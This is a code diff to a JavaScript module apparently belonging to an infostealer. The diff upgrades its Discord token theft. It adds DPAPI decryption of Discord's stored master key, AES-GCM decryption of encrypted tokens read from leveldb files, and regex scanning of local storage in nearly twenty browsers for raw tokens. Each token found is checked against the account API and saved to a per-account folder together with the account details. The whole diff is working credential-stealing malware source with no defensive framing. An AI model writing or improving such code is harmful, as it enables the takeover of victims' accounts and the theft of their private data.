@@ -5,7 +5,9 @@
 
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 const axios = require('axios');
+const dpapi = require('@primno/dpapi');
 const CoreUtils = require('../../core/utils');
 const { logger } = require('../../core/logger');
 const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors');
@@ -31,36 +33,60 @@ class DiscordService {
         return {
             discord: {
                 name: 'Discord',
-                paths: [
-                    path.join(appData, 'discord', 'Local Storage', 'leveldb'),
-                    path.join(appData, 'Discord', 'Local Storage', 'leveldb')
+                basePaths: [
+                    path.join(appData, 'discord'),
+                    path.join(appData, 'Discord')
                 ]
             },
             discordCanary: {
                 name: 'Discord Canary',
-                paths: [
-                    path.join(appData, 'discordcanary', 'Local Storage', 'leveldb')
+                basePaths: [
+                    path.join(appData, 'discordcanary')
                 ]
             },
             discordPTB: {
                 name: 'Discord PTB',
-                paths: [
-                    path.join(appData, 'discordptb', 'Local Storage', 'leveldb')
+                basePaths: [
+                    path.join(appData, 'discordptb')
                 ]
             },
             lightcord: {
                 name: 'Lightcord',
-                paths: [
-                    path.join(appData, 'Lightcord', 'Local Storage', 'leveldb')
-                ]
-            },
-            betterdiscord: {
-                name: 'BetterDiscord',
-                paths: [
-                    path.join(appData, 'BetterDiscord', 'data')
+                basePaths: [
+                    path.join(appData, 'Lightcord')
                 ]
             }
         };
+    }
+
+    /**
+     * Get browser paths for Discord tokens
+     * @returns {Array} Array of browser paths
+     */
+    getBrowserPaths() {
+        const appData = process.env.APPDATA || '';
+        const localAppData = process.env.LOCALAPPDATA || '';
+
+        return [
+            path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
+            path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Epic Privacy Browser', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Sputnik', 'Sputnik', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, '7Star', '7Star', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'CentBrowser', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Orbitum', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Kometa', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Torch', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Amigo', 'User Data', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'uCozMedia', 'Uran', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+            path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb')
+        ];
     }
 
     /**
@@ -71,118 +97,271 @@ class DiscordService {
         logger.info('Starting Discord account collection');
 
         const accounts = [];
+        const allTokens = new Set();
 
         try {
+            // Collect tokens from Discord applications
             for (const [clientKey, clientConfig] of Object.entries(this.discordPaths)) {
                 try {
-                    const clientAccounts = await this.collectClientAccounts(clientKey, clientConfig);
-                    accounts.push(...clientAccounts);
+                    const clientTokens = await this.collectClientTokens(clientKey, clientConfig);
+                    clientTokens.forEach(token => allTokens.add(token));
                 } catch (error) {
                     ErrorHandler.handle(
-                        new ModuleError(`Failed to collect accounts from ${clientConfig.name}`, 'discord'),
+                        new ModuleError(`Failed to collect tokens from ${clientConfig.name}`, 'discord'),
                         null,
                         { client: clientKey }
                     );
                 }
             }
 
-            // Remove duplicates based on token
-            const uniqueAccounts = this.removeDuplicateAccounts(accounts);
+            // Collect tokens from browsers
+            try {
+                const browserTokens = await this.collectBrowserTokens();
+                browserTokens.forEach(token => allTokens.add(token));
+            } catch (error) {
+                ErrorHandler.handle(
+                    new ModuleError('Failed to collect tokens from browsers', 'discord'),
+                    null,
+                    { source: 'browsers' }
+                );
+            }
+
+            // Get account information for all unique tokens
+            for (const token of allTokens) {
+                try {
+                    const accountData = await this.getAccountInfo(token);
+                    if (accountData) {
+                        // Create individual folder for each Discord account
+                        const accountFolderName = this.getAccountFolderName(accountData);
+                        const folderPath = `Discord/${accountFolderName}`;
+                        
+                        // Save token to token.txt file in account's folder
+                        fileManager.saveText(token, folderPath, 'token.txt');
+                        
+                        // Save account info as well for reference
+                        fileManager.saveJson(accountData, folderPath, 'account_info.json');
+                        
+                        accounts.push({
+                            ...accountData,
+                            token: token
+                        });
+                    }
+                } catch (error) {
+                    logger.debug(`Failed to get account info for token`, error.message);
+                }
+            }
 
             // Update statistics
-            for (const account of uniqueAccounts) {
+            for (const account of accounts) {
                 stats.addDiscordAccount(account);
             }
 
             logger.info(`Discord account collection completed`, {
-                totalAccounts: uniqueAccounts.length,
+                totalAccounts: accounts.length,
+                totalTokens: allTokens.size,
                 clients: Object.keys(this.discordPaths).length
             });
 
-            return uniqueAccounts;
+            return accounts;
         } catch (error) {
             throw new ModuleError('Discord account collection failed', 'discord');
         }
     }
 
     /**
-     * Collect accounts from specific Discord client
+     * Extract master key from Discord Local State file
+     * @param {string} basePath - Base path to Discord installation
+     * @returns {Buffer|null} Master key or null if failed
+     */
+    getMasterKey(basePath) {
+        try {
+            const localStatePath = path.join(basePath, 'Local State');
+            
+            if (!fs.existsSync(localStatePath)) {
+                return null;
+            }
+
+            const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf-8'));
+            const encryptedKey = localStateData?.os_crypt?.encrypted_key;
+
+            if (!encryptedKey) {
+                return null;
+            }
+
+            // Decode base64 and remove DPAPI prefix (first 5 bytes)
+            const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
+            
+            // Decrypt using DPAPI
+            const masterKey = dpapi.unprotectData(encrypted, null, 'CurrentUser');
+            
+            return masterKey;
+        } catch (error) {
+            logger.debug(`Failed to extract master key from ${basePath}`, error.message);
+            return null;
+        }
+    }
+
+    /**
+     * Get encrypted tokens from leveldb files
+     * @param {string} leveldbPath - Path to leveldb directory
+     * @returns {Array<string>} Array of encrypted tokens
+     */
+    getEncryptedTokens(leveldbPath) {
+        const encryptedTokens = [];
+
+        try {
+            if (!fs.existsSync(leveldbPath)) {
+                return encryptedTokens;
+            }
+
+            const files = fs.readdirSync(leveldbPath);
+            const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/gm;
+
+            for (const file of files) {
+                if (!(file.endsWith('.log') || file.endsWith('.ldb'))) {
+                    continue;
+                }
+
+                try {
+                    const filePath = path.join(leveldbPath, file);
+                    const content = fs.readFileSync(filePath, 'utf-8');
+                    const matches = content.match(encryptedRegex);
+                    
+                    if (matches) {
+                        encryptedTokens.push(...matches);
+                    }
+                } catch (error) {
+                    // Skip files that can't be read
+                    continue;
+                }
+            }
+        } catch (error) {
+            logger.debug(`Failed to extract encrypted tokens from ${leveldbPath}`, error.message);
+        }
+
+        // Remove duplicates
+        return [...new Set(encryptedTokens)].filter(token => token != null);
+    }
+
+    /**
+     * Decrypt Discord tokens using master key
+     * @param {Array<string>} encryptedTokens - Array of encrypted tokens
+     * @param {Buffer} masterKey - Master key for decryption
+     * @returns {Array<string>} Array of decrypted tokens
+     */
+    decryptTokens(encryptedTokens, masterKey) {
+        const tokens = [];
+
+        for (const encryptedToken of encryptedTokens) {
+            try {
+                // Extract the encrypted data after 'dQw4w9WgXcQ:' prefix
+                const tokenData = Buffer.from(encryptedToken.split('dQw4w9WgXcQ:')[1], 'base64');
+                
+                // Extract components: iv (12 bytes), encrypted data, auth tag (16 bytes)
+                const iv = tokenData.slice(3, 15);
+                const encryptedData = tokenData.slice(15, tokenData.length - 16);
+                const authTag = tokenData.slice(tokenData.length - 16);
+
+                // Create decipher
+                const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
+                decipher.setAuthTag(authTag);
+
+                // Decrypt token
+                let decryptedToken = decipher.update(encryptedData, null, 'utf-8');
+                decryptedToken += decipher.final('utf-8');
+
+                if (decryptedToken) {
+                    tokens.push(decryptedToken);
+                }
+            } catch (error) {
+                // Skip invalid tokens
+                continue;
+            }
+        }
+
+        return tokens;
+    }
+
+    /**
+     * Collect tokens from specific Discord client
      * @param {string} clientKey - Client identifier
      * @param {Object} clientConfig - Client configuration
-     * @returns {Promise<Array>} Array of accounts
+     * @returns {Promise<Array>} Array of tokens
      */
-    async collectClientAccounts(clientKey, clientConfig) {
-        const accounts = [];
+    async collectClientTokens(clientKey, clientConfig) {
+        const tokens = [];
 
-        for (const clientPath of clientConfig.paths) {
-            if (!fs.existsSync(clientPath)) {
+        for (const basePath of clientConfig.basePaths) {
+            if (!fs.existsSync(basePath)) {
                 continue;
             }
 
             try {
-                // Extract tokens from leveldb files
-                const tokens = this.extractTokensFromPath(clientPath);
-                
-                for (const token of tokens) {
-                    try {
-                        const accountData = await this.getAccountInfo(token);
-                        if (accountData) {
-                            // Create individual folder for each Discord account
-                            const accountFolderName = this.getAccountFolderName(accountData);
-                            const folderPath = `Discord/${accountFolderName}`;
-                            
-                            // Save token to token.txt file in account's folder
-                            fileManager.saveText(token, folderPath, 'token.txt');
-                            
-                            // Save account info as well for reference
-                            fileManager.saveJson(accountData, folderPath, 'account_info.json');
-                            
-                            accounts.push({
-                                ...accountData,
-                                client: clientConfig.name,
-                                token: token
-                            });
-                        }
-                    } catch (error) {
-                        logger.debug(`Failed to get account info for token`, error.message);
-                    }
+                // Get master key
+                const masterKey = this.getMasterKey(basePath);
+                if (!masterKey) {
+                    logger.debug(`No master key found for ${clientConfig.name} at ${basePath}`);
+                    continue;
                 }
+
+                // Get leveldb path
+                const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb');
+                
+                // Get encrypted tokens
+                const encryptedTokens = this.getEncryptedTokens(leveldbPath);
+                if (encryptedTokens.length === 0) {
+                    continue;
+                }
+
+                // Decrypt tokens
+                const decryptedTokens = this.decryptTokens(encryptedTokens, masterKey);
+                tokens.push(...decryptedTokens);
+
+                logger.debug(`Found ${decryptedTokens.length} tokens from ${clientConfig.name} at ${basePath}`);
             } catch (error) {
-                logger.debug(`Failed to process ${clientConfig.name} at ${clientPath}`, error.message);
+                logger.debug(`Failed to process ${clientConfig.name} at ${basePath}`, error.message);
             }
         }
 
-        return accounts;
+        return tokens;
     }
 
     /**
-     * Extract Discord tokens from leveldb files
-     * @param {string} leveldbPath - Path to leveldb directory
-     * @returns {Array<string>} Array of tokens
+     * Collect tokens from browsers
+     * @returns {Promise<Array>} Array of tokens
      */
-    extractTokensFromPath(leveldbPath) {
-        const tokens = new Set();
+    async collectBrowserTokens() {
+        const tokens = [];
+        const browserPaths = this.getBrowserPaths();
 
-        try {
-            const files = fs.readdirSync(leveldbPath);
-            
-            for (const file of files) {
-                if (file.endsWith('.ldb') || file.endsWith('.log')) {
+        // Token patterns for direct token search in browsers
+        const cleanRegex = [
+            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gm,          // Standard user tokens
+            /mfa\.[\w-]{84}/gm,                          // MFA tokens  
+            /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/gm       // Variable length tokens
+        ];
+
+        for (const browserPath of browserPaths) {
+            if (!fs.existsSync(browserPath)) {
+                continue;
+            }
+
+            try {
+                const files = fs.readdirSync(browserPath);
+                
+                for (const file of files) {
+                    if (!(file.endsWith('.log') || file.endsWith('.ldb'))) {
+                        continue;
+                    }
+
                     try {
-                        const filePath = path.join(leveldbPath, file);
-                        const content = fs.readFileSync(filePath, 'utf8');
-                        
-                        // Extract tokens using regex patterns
-                        const tokenPatterns = [
-                            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g,          // Bot tokens
-                            /mfa\.[\w-]{84}/g,                          // MFA tokens
-                            /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g          // User tokens
-                        ];
+                        const filePath = path.join(browserPath, file);
+                        const content = fs.readFileSync(filePath, 'utf-8');
 
-                        for (const pattern of tokenPatterns) {
-                            const matches = content.match(pattern);
+                        for (const regex of cleanRegex) {
+                            const matches = content.match(regex);
                             if (matches) {
-                                matches.forEach(token => tokens.add(token));
+                                tokens.push(...matches);
                             }
                         }
                     } catch (error) {
@@ -190,12 +369,13 @@ class DiscordService {
                         continue;
                     }
                 }
+            } catch (error) {
+                logger.debug(`Failed to process browser path ${browserPath}`, error.message);
             }
-        } catch (error) {
-            logger.debug(`Failed to extract tokens from ${leveldbPath}`, error.message);
         }
 
-        return Array.from(tokens);
+        // Remove duplicates and null values
+        return [...new Set(tokens)].filter(token => token != null);
     }
 
     /**
@@ -327,22 +507,6 @@ class DiscordService {
         }
         
         return folderName;
-    }
-
-    /**
-     * Remove duplicate accounts based on user ID
-     * @param {Array} accounts - Array of accounts
-     * @returns {Array} Unique accounts
-     */
-    removeDuplicateAccounts(accounts) {
-        const seen = new Set();
-        return accounts.filter(account => {
-            if (seen.has(account.id)) {
-                return false;
-            }
-            seen.add(account.id);
-            return true;
-        });
     }
 
     /**
